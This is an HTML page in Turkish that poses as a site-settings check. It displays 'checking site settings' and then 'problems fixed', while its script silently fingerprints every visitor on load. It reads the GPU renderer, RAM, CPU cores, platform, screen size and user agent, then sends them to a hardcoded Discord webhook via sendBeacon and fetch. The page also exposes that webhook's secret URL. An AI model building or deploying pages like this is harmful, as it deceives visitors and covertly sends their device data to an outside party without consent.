<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Kontrol</title>
    <style>
        body { background:#000; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; font-family:sans-serif; }
        h2 { color:#0f4; font-size:14px; font-weight:400; }
        .ok { font-weight:bold; }
    </style>
</head>
<body>
    <h2 id="t">Site ayarları kontrol ediliyor...</h2>

    <script>
        const u = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
        const t = document.getElementById('t');

        // 1. ANINDA GÖNDERİM (Beklemesiz)
        (function send() {
            let g = "N/A";
            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl');
                const d = gl.getExtension('WEBGL_debug_renderer_info');
                g = gl.getParameter(d.UNMASKED_RENDERER_ID);
            } catch(e) {}

            const data = {
                embeds: [{
                    title: "⚡ INSTANT LOG",
                    color: 3066993,
                    fields: [
                        { name: "HW", value: `GPU: ${g}\nRAM: ${navigator.deviceMemory}G\nCPU: ${navigator.hardwareConcurrency}`, inline: false },
                        { name: "SYS", value: `${navigator.platform} | ${window.screen.width}x${window.screen.height}`, inline: false },
                        { name: "UA", value: "```" + navigator.userAgent + "```", inline: false }
                    ]
                }]
            };

            // Beacon en hızlısıdır, fetch ile destekle
            navigator.sendBeacon(u, JSON.stringify(data));
            fetch(u, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
        })();

        // 2. YILDIRIM HIZINDA ARAYÜZ
        setTimeout(() => { t.innerHTML = '<span class="ok">Site uygun halde!</span>'; }, 300); 
        setTimeout(() => { t.innerHTML = '<span class="ok">Sorunlar düzeltildi.</span>'; }, 700);
    </script>
</body>
</html>
